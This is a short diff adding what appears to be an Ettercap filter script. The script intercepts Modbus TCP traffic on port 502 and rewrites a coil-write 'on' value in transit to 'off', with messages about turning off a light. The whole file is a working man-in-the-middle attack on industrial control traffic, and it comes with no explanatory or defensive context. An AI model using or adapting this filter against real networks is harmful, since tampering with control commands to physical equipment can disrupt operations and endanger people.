@@ -1,0 +1,10 @@
+if (ip.proto == TCP && tcp.dst == 502) {
+	if (search(DATA.data, "\x40\x00\xFF\x00")){
+		msg("Attempting to turn off light");
+		if (replace("\x40\x00\xFF\x00", "\x40\x00\x00\x00")){
+			msg("Success");
+		} else {
+			msg("Failed");
+		}
+	}
+}
